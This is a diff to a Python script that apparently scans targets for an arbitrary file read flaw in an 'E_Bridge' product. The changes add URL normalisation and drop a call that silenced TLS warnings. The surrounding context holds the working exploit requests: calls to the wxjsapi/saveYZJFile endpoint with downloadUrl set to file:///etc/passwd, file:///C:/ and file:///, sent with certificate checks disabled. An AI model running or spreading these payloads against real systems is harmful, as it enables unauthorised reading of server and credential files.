@@ -17,6 +17,10 @@ def now_time():
 
 # 判断操作系统 or 判断漏洞是否可利用
 def check(target_url):
+    if target_url[:4]!='http':
+        target_url = 'http://' + target_url
+    if target_url[-1]!='/':
+        target_url += '/' 
     vuln_url_1 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
     vuln_url_2 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
     vuln_url_3 = target_url + "wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt"
@@ -27,7 +31,6 @@ def check(target_url):
     }
     console.print(now_time() + " [INFO]     正在检测E_Bridge_Arbitrary_File_Read漏洞", style='bold blue')
     try:
-        requests.packages.urllib3.disable_warnings()
         response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=5)
         response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=5)
         response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=5)
